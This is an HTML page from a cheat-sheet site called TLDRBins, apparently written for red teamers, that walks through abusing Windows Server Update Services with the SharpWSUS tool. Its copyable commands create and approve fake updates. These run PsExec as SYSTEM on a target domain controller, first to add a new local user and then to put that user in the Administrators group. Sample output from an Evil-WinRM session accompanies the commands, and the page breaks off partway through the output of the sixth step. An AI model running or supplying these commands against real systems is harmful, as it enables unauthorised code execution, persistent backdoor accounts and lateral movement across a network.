@@ -1,0 +1,416 @@
+<!DOCTYPE html><html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant="" defer=""></script>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<meta name="description" content="">
+<title>WSUS | TLDRBins</title>
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+</head>
+<body>
+<header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a><span class="hl"> / </span>
+    <a href="https://tldrbins.github.io/wsus/"><span>WSUS</span></a></h1>
+  <div class="theme-toggle-wrapper">
+    <div class="theme-toggle">
+      <div class="theme-toggle-track">
+        <div class="theme-toggle-track-dark">
+          <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+        </div>
+        <div class="theme-toggle-track-light">
+          <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+        </div>
+      </div>
+      <div class="theme-toggle-thumb"></div>
+      <input class="theme-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
+    </div>
+  </div>
+  <style>
+  .theme-toggle-wrapper, .theme-toggle {
+      margin: 0;
+      padding: 0;
+      border: 0;
+      box-sizing: border-box;
+  }
+
+  .theme-toggle-wrapper {
+      display: table;
+      float: right;
+      margin-left: auto;
+  }
+
+  .theme-toggle {
+      touch-action: pan-x;
+      display: inline-block;
+      position: relative;
+      cursor: pointer;
+      background-color: transparent;
+      user-select: none;
+  }
+
+  .theme-toggle-screenreader-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      margin: -1px;
+      padding: 0;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+  }
+
+  .theme-toggle-track {
+      width: 50px;
+      height: 24px;
+      border-radius: 30px;
+      background-color: hsl(223, 61%, 44%);
+      transition: background-color 0.2s ease;
+  }
+
+  .theme-toggle-track-dark,
+  .theme-toggle-track-light {
+      position: absolute;
+      width: 17px;
+      height: 17px;
+      top: 50%;
+      transform: translateY(-50%);
+      transition: opacity 0.25s ease;
+  }
+
+  .theme-toggle-track-dark {
+      left: 5px;
+      opacity: 0;
+  }
+
+  .theme-toggle--checked .theme-toggle-track-dark {
+      opacity: 1;
+  }
+
+  .theme-toggle-track-light {
+      right: 5px;
+      opacity: 1;
+  }
+
+  .theme-toggle--checked .theme-toggle-track-light {
+      opacity: 0;
+  }
+
+  .theme-toggle--checked .theme-toggle-track {
+      background-color: hsl(222, 14%, 7%);
+  }
+
+  .theme-toggle-thumb {
+      position: absolute;
+      top: 1px;
+      left: 1px;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background-color: #fafafa;
+      transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+  }
+
+  .theme-toggle--checked .theme-toggle-thumb {
+      transform: translateX(26px);
+  }
+  </style>
+  <script>
+      const body = document.body;
+      const themeSwitcher = document.querySelector('.theme-toggle');      
+
+      themeSwitcher.addEventListener('click', () => {
+          const isDarkMode = themeSwitcher.classList.toggle('theme-toggle--checked');
+          body.classList.toggle('dark-mode', isDarkMode);
+          if (isDarkMode) {
+              localStorage.setItem('darkMode', 'true');
+          } else {
+              localStorage.removeItem('darkMode');
+          }
+      });      
+
+      if (localStorage.getItem('darkMode')) {
+          themeSwitcher.classList.add('theme-toggle--checked');
+          body.classList.add('dark-mode');
+      }
+  </script>
+  <p class="desc"></p>
+</header>
+<main>
+<ul class="tagsList single">
+  <li><a href="https://tldrbins.github.io/@wsus/">WSUS</a></li>
+  <li><a href="https://tldrbins.github.io/@windows-server-update-services/">Windows Server Update Services</a></li>
+  <li><a href="https://tldrbins.github.io/@sharpwsus/">SharpWSUS</a></li>
+  <li><a href="https://tldrbins.github.io/@patch-management/">Patch Management</a></li>
+  <li><a href="https://tldrbins.github.io/@update-deployment/">Update Deployment</a></li>
+  <li><a href="https://tldrbins.github.io/@lateral-movement/">Lateral Movement</a></li>
+  <li><a href="https://tldrbins.github.io/@microsoft-updates/">Microsoft Updates</a></li>
+  <li><a href="https://tldrbins.github.io/@system-administration/">System Administration</a></li>
+  <li><a href="https://tldrbins.github.io/@network-security/">Network Security</a></li>
+</ul>
+<hr>
+<div class="content">
+  <div class="tips">
+  <p><strong>Usage Tips:</strong></p>
+  <ul>
+    <li>Click on a keyword to enable inline editing.</li>
+    <li>Click inside a code block to copy (excludes comments).</li>
+    <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
+    <li>Click outside to collapse all examples.</li>
+  </ul>
+</div>
+  <div id="dynamicFormContainer">
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="GROUP_1">GROUP 1: </label><input type="text" name="GROUP_1"></div><div class="input-group"><label for="GROUP_2">GROUP 2: </label><input type="text" name="GROUP_2"></div><div class="input-group"><label for="NEW_PASSWORD">NEW PASSWORD: </label><input type="text" name="NEW_PASSWORD"></div><div class="input-group"><label for="NEW_USER">NEW USER: </label><input type="text" name="NEW_USER"></div><div class="input-group"><label for="TARGET_DOMAIN">TARGET DOMAIN: </label><input type="text" name="TARGET_DOMAIN"></div><div class="input-group"><label for="UPDATE_ID_1">UPDATE ID 1: </label><input type="text" name="UPDATE_ID_1"></div><div class="input-group"><label for="UPDATE_ID_2">UPDATE ID 2: </label><input type="text" name="UPDATE_ID_2"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
+	<div class="buttons center">
+		<button id="form_btn">Show Inspector</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
+  <h3 id="abuse-1-deploy-an-update">Abuse #1: Deploy an Update</h3>
+<p class="tabs">
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
+
+</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-inspect-wsus">1. Inspect WSUS</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpWSUS.exe inspect
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Programdata&gt; .\SharpWSUS.exe inspect
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> ____  _                   __        ______  _   _ ____
+</span></span></span><span class="line"><span class="cl"><span class="go">/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+</span></span></span><span class="line"><span class="cl"><span class="go">\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+</span></span></span><span class="line"><span class="cl"><span class="go"> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+</span></span></span><span class="line"><span class="cl"><span class="go">|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+</span></span></span><span class="line"><span class="cl"><span class="go">                       |_|
+</span></span></span><span class="line"><span class="cl"><span class="go">           Phil Keeble @ Nettitude Red Team
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Inspect WSUS Server
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1">################ WSUS Server Enumeration via SQL ##################</span>
+</span></span><span class="line"><span class="cl"><span class="go">ServerName, WSUSPortNumber, WSUSContentLocation
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go">SRV, 8530, C:\WSUS-Updates\WsusContent
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1">###################### Computer Enumeration #######################</span>
+</span></span><span class="line"><span class="cl"><span class="go">ComputerName, IPAddress, OSVersion, LastCheckInTime
+</span></span></span><span class="line"><span class="cl"><span class="go">---------------------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go">dc.example.com, 10.10.141.53, 10.0.20348.2031, 8/6/2025 12:45:20 PM
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1">###################### Downstream Server Enumeration #######################</span>
+</span></span><span class="line"><span class="cl"><span class="go">ComputerName, OSVersion, LastCheckInTime
+</span></span></span><span class="line"><span class="cl"><span class="go">---------------------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1">###################### Group Enumeration #######################</span>
+</span></span><span class="line"><span class="cl"><span class="go">GroupName
+</span></span></span><span class="line"><span class="cl"><span class="go">---------------------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go">All Computers
+</span></span></span><span class="line"><span class="cl"><span class="go">Downstream Servers
+</span></span></span><span class="line"><span class="cl"><span class="go">Unassigned Computers
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Inspect complete
+</span></span></span></div></pre></div><h4 id="2-create-an-update-add-a-new-user">2. Create an Update [Add a New User]</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpWSUS.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user <span class="o editable-keyword">&lt;NEW_USER&gt;</span> <span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span> /add\""
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">C:\ProgramData&gt;.\SharpWSUS.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user dummy Test1234 /add\""
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> ____  _                   __        ______  _   _ ____
+</span></span></span><span class="line"><span class="cl"><span class="go">/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+</span></span></span><span class="line"><span class="cl"><span class="go">\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+</span></span></span><span class="line"><span class="cl"><span class="go"> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+</span></span></span><span class="line"><span class="cl"><span class="go">|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+</span></span></span><span class="line"><span class="cl"><span class="go">                       |_|
+</span></span></span><span class="line"><span class="cl"><span class="go">           Phil Keeble @ Nettitude Red Team
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Create Update
+</span></span></span><span class="line"><span class="cl"><span class="go">C:\WSUS-Updates\WsusContent
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating patch to use the following:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Payload: PSExec64.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Payload Path: C:\_install\PSExec64.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Arguments: -accepteula -s -d cmd.exe /c "net user dummy Test1234 /add"
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c &amp;amp;quot;net user dummy Test1234 /add&amp;amp;quot;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1">################ WSUS Server Enumeration via SQL ##################</span>
+</span></span><span class="line"><span class="cl"><span class="go">ServerName, WSUSPortNumber, WSUSContentLocation
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go">SRV, 8530, C:\WSUS-Updates\WsusContent
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">ImportUpdate
+</span></span></span><span class="line"><span class="cl"><span class="go">Update Revision ID: 198781
+</span></span></span><span class="line"><span class="cl"><span class="go">PrepareXMLtoClient
+</span></span></span><span class="line"><span class="cl"><span class="go">InjectURL2Download
+</span></span></span><span class="line"><span class="cl"><span class="go">DeploymentRevision
+</span></span></span><span class="line"><span class="cl"><span class="go">PrepareBundle
+</span></span></span><span class="line"><span class="cl"><span class="go">PrepareBundle Revision ID: 198782
+</span></span></span><span class="line"><span class="cl"><span class="go">PrepareXMLBundletoClient
+</span></span></span><span class="line"><span class="cl"><span class="go">DeploymentRevision
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Update created - When ready to deploy use the following command:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] SharpWSUS.exe approve /updateid:dc8ab883-3f69-4df7-a365-af802afa11c2 /computername:Target.FQDN /groupname:"Group Name"
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] To check on the update status use the following command:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] SharpWSUS.exe check /updateid:dc8ab883-3f69-4df7-a365-af802afa11c2 /computername:Target.FQDN
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] To delete the update use the following command:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] SharpWSUS.exe delete /updateid:dc8ab883-3f69-4df7-a365-af802afa11c2 /computername:Target.FQDN /groupname:"Group Name"
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Create complete
+</span></span></span></div></pre></div><h4 id="3-approve-the-update">3. Approve the Update</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpWSUS.exe approve /updateid:<span class="o editable-keyword">&lt;UPDATE_ID_1&gt;</span> /computername:<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span> /groupname:"<span class="o editable-keyword">&lt;GROUP_1&gt;</span>"
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">C:\ProgramData&gt;.\SharpWSUS.exe approve /updateid:dc8ab883-3f69-4df7-a365-af802afa11c2 /computername:dc.example.com /groupname:"Group Name1"
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> ____  _                   __        ______  _   _ ____
+</span></span></span><span class="line"><span class="cl"><span class="go">/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+</span></span></span><span class="line"><span class="cl"><span class="go">\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+</span></span></span><span class="line"><span class="cl"><span class="go"> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+</span></span></span><span class="line"><span class="cl"><span class="go">|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+</span></span></span><span class="line"><span class="cl"><span class="go">                       |_|
+</span></span></span><span class="line"><span class="cl"><span class="go">           Phil Keeble @ Nettitude Red Team
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Approve Update
+</span></span></span><span class="line"><span class="cl"><span class="go">C:\WSUS-Updates\WsusContent
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Targeting dc.example.com
+</span></span></span><span class="line"><span class="cl"><span class="go">TargetComputer, ComputerID, TargetID
+</span></span></span><span class="line"><span class="cl"><span class="go">------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go">dc.example.com, a9d52bcf-9d8d-4afa-b602-09a1e977d6fb, 1
+</span></span></span><span class="line"><span class="cl"><span class="go">Group Exists = False
+</span></span></span><span class="line"><span class="cl"><span class="go">Group Created: Group Name1
+</span></span></span><span class="line"><span class="cl"><span class="go">Added Computer To Group
+</span></span></span><span class="line"><span class="cl"><span class="go">Approved Update
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Approve complete
+</span></span></span></div></pre></div><h4 id="4-check-optional">4. Check [Optional]</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># In RDP Session
+</span></span><span class="line"><span class="cl">Search -&gt; Update Services
+</span></span><span class="line"><span class="cl">Updates -&gt; All Updates
+</span></span><span class="line"><span class="cl">Approval: Any Except Declined, Status: Any -&gt; Refresh
+</span></span><span class="line"><span class="cl">SharpWSUS Update -&gt; 100%
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="5-create-an-update-add-new-user-to-administrators">5. Create an Update [Add New User to Administrators]</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpWSUS.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup Administrators <span class="o editable-keyword">&lt;NEW_USER&gt;</span> /add\""
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">C:\ProgramData&gt;.\SharpWSUS.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators dummy /add\""
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> ____  _                   __        ______  _   _ ____
+</span></span></span><span class="line"><span class="cl"><span class="go">/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+</span></span></span><span class="line"><span class="cl"><span class="go">\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+</span></span></span><span class="line"><span class="cl"><span class="go"> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+</span></span></span><span class="line"><span class="cl"><span class="go">|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+</span></span></span><span class="line"><span class="cl"><span class="go">                       |_|
+</span></span></span><span class="line"><span class="cl"><span class="go">           Phil Keeble @ Nettitude Red Team
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Create Update
+</span></span></span><span class="line"><span class="cl"><span class="go">C:\WSUS-Updates\WsusContent
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating patch to use the following:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Payload: PSExec64.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Payload Path: C:\_install\PSExec64.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Arguments: -accepteula -s -d cmd.exe /c "net localgroup administrators dummy /add"
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c &amp;amp;quot;net localgroup administrators dummy /add&amp;amp;quot;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span><span class="c1">################ WSUS Server Enumeration via SQL ##################</span>
+</span></span><span class="line"><span class="cl"><span class="go">ServerName, WSUSPortNumber, WSUSContentLocation
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go">SRV, 8530, C:\WSUS-Updates\WsusContent
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">ImportUpdate
+</span></span></span><span class="line"><span class="cl"><span class="go">Update Revision ID: 198783
+</span></span></span><span class="line"><span class="cl"><span class="go">PrepareXMLtoClient
+</span></span></span><span class="line"><span class="cl"><span class="go">InjectURL2Download
+</span></span></span><span class="line"><span class="cl"><span class="go">DeploymentRevision
+</span></span></span><span class="line"><span class="cl"><span class="go">PrepareBundle
+</span></span></span><span class="line"><span class="cl"><span class="go">PrepareBundle Revision ID: 198784
+</span></span></span><span class="line"><span class="cl"><span class="go">PrepareXMLBundletoClient
+</span></span></span><span class="line"><span class="cl"><span class="go">DeploymentRevision
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Update created - When ready to deploy use the following command:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] SharpWSUS.exe approve /updateid:424ccbb8-6055-41c8-8d0c-5d895d032029 /computername:Target.FQDN /groupname:"Group Name"
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] To check on the update status use the following command:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] SharpWSUS.exe check /updateid:424ccbb8-6055-41c8-8d0c-5d895d032029 /computername:Target.FQDN
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] To delete the update use the following command:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] SharpWSUS.exe delete /updateid:424ccbb8-6055-41c8-8d0c-5d895d032029 /computername:Target.FQDN /groupname:"Group Name"
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Create complete
+</span></span></span></div></pre></div><h4 id="6-approve-the-update">6. Approve the Update</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpWSUS.exe approve /updateid:<span class="o editable-keyword">&lt;UPDATE_ID_2&gt;</span> /computername:<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span> /groupname:"<span class="o editable-keyword">&lt;GROUP_2&gt;</span>"
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">C:\ProgramData&gt;.\SharpWSUS.exe approve /updateid:424ccbb8-6055-41c8-8d0c-5d895d032029 /computername:dc.example.com /groupname:"Group Name3"
